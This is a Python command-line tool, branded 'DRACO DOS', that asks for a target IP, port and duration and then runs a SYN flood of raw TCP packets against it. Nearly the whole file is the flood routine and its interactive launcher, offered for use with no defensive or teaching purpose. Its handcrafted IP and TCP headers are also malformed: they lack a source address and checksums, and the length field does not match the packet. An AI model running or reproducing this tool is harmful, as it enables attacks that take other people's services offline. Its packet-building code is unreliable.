import socket
import random
import time
import os
import sys
from colorama import Fore, Style, init

init()

def check_root():
    """Check if the script is running with administrator privileges"""
    if os.name == 'nt':  # Windows
        import ctypes
        if not ctypes.windll.shell32.IsUserAnAdmin():
            print("This script requires administrator privileges. Please run as administrator.")
            sys.exit(1)

def rainbow_text(text):
    """Convert text to rainbow colors"""
    colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
    colored_text = ""
    for i, char in enumerate(text):
        color = colors[i % len(colors)]
        colored_text += f"{color}{char}"
    return colored_text + Style.RESET_ALL

def syn_flood(target_ip, target_port, duration, packet_size):
    """Perform a SYN flood attack"""
    try:
        # Create a raw socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        
        # Set socket options for Windows
        if os.name == 'nt':
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.bind(('0.0.0.0', 0))  # Bind to any available port
        
        # Prepare the IP header
        ip_header = b'\x45\x00'  # Version and IHL, TOS
        ip_header += (packet_size).to_bytes(2, 'big')  # Total Length
        ip_header += b'\x00\x00\x00\x00\x40\x06\x00\x00'  # ID, Flags, TTL, Protocol
        ip_header += socket.inet_aton(target_ip)  # Destination IP
        
        # Prepare the TCP header
        source_port = random.randint(1024, 65535)
        tcp_header = source_port.to_bytes(2, 'big')  # Source Port
        tcp_header += (target_port).to_bytes(2, 'big')  # Destination Port
        tcp_header += b'\x00\x00\x00\x00\x50\x02\x00\x00\x00\x00\x00\x00'  # Flags, Window Size
        
        # Combine headers
        packet = ip_header + tcp_header
        
        start_time = time.time()
        packet_count = 0
        
        print(rainbow_text(f"\nStarting SYN flood attack on {target_ip}:{target_port}..."))
        
        while time.time() - start_time < duration:
            try:
                # Send the packet
                sock.sendto(packet, (target_ip, target_port))
                packet_count += 1
                print(rainbow_text(f"Sent packet #{packet_count} to {target_ip}:{target_port}"))
                time.sleep(0.01)  # Small delay to prevent overwhelming the system
            except Exception as e:
                print(rainbow_text(f"Error sending packet: {e}"))
                break
        
        print(rainbow_text(f"\nAttack completed!"))
        print(rainbow_text(f"Total packets sent: {packet_count}"))
        
    except PermissionError:
        print(rainbow_text("Error: You need administrator privileges to run this tool."))
    except Exception as e:
        print(rainbow_text(f"An error occurred: {e}"))
    finally:
        sock.close()

def main():
    check_root()
    print(rainbow_text("""
    ██████╗ ██████╗  █████╗  ██████╗ ██████╗     ██████╗  ██████╗ ███████╗
    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔═══██╗    ██╔══██╗██╔═══██╗██╔════╝
    ██║  ██║██████╔╝███████║██║     ██║   ██║    ██║  ██║██║   ██║███████╗
    ██║  ██║██╔══██╗██╔══██║██║     ██║   ██║    ██║  ██║██║   ██║╚════██║
    ██████╔╝██║  ██║██║  ██║╚██████╗╚██████╔╝    ██████╔╝╚██████╔╝███████║
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝     ╚═════╝  ╚═════╝ ╚══════╝
    """))
    
    try:
        target_ip = input(rainbow_text("Enter target IP address: "))
        target_port = int(input(rainbow_text("Enter target port: ")))
        duration = int(input(rainbow_text("Enter attack duration (seconds): ")))
        packet_size = int(input(rainbow_text("Enter packet size (bytes, 40-65535): ")))
        
        if packet_size < 40 or packet_size > 65535:
            print(rainbow_text("Invalid packet size. Using default size of 40 bytes."))
            packet_size = 40
        
        syn_flood(target_ip, target_port, duration, packet_size)
        
    except ValueError:
        print(rainbow_text("Invalid input. Please enter valid numbers."))
    except KeyboardInterrupt:
        print(rainbow_text("\nAttack stopped by user."))

if __name__ == "__main__":
    main()





    